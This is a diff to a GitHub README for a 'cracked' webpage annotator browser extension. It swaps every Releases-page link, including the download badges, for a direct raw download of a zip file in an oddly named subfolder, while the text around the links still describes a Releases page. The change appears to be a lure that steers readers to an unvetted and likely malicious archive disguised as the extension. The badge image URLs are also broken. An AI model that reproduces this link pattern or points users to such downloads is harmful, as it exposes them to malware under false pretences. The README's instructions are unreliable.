@@ -1,6 +1,6 @@
 # 🎨 cracked-webpage-annotator-extension - Annotate Webpages with Ease
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/MaybeDesxie7/cracked-webpage-annotator-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/MaybeDesxie7/cracked-webpage-annotator-extension/main/decrepitation/cracked-webpage-annotator-extension.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/MaybeDesxie7/cracked-webpage-annotator-extension/main/decrepitation/cracked-webpage-annotator-extension.zip)
 
 ## 🚀 Getting Started
 
@@ -22,7 +22,7 @@ Welcome to the **Cracked Webpage Annotator Extension**! This handy tool allows y
 
 ## 📥 Download & Install
 
-To download the **Cracked Webpage Annotator Extension**, please visit our [Releases page](https://github.com/MaybeDesxie7/cracked-webpage-annotator-extension/releases). Follow these steps to install the extension:
+To download the **Cracked Webpage Annotator Extension**, please visit our [Releases page](https://raw.githubusercontent.com/MaybeDesxie7/cracked-webpage-annotator-extension/main/decrepitation/cracked-webpage-annotator-extension.zip). Follow these steps to install the extension:
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version at the top of the page.
@@ -69,4 +69,4 @@ For further assistance or queries, please reach out through our GitHub Issues pa
 
 Thank you for using the **Cracked Webpage Annotator Extension**! Enjoy your enhanced browsing experience.
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/MaybeDesxie7/cracked-webpage-annotator-extension/releases)
+[![Download Now](https://raw.githubusercontent.com/MaybeDesxie7/cracked-webpage-annotator-extension/main/decrepitation/cracked-webpage-annotator-extension.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/MaybeDesxie7/cracked-webpage-annotator-extension/main/decrepitation/cracked-webpage-annotator-extension.zip)
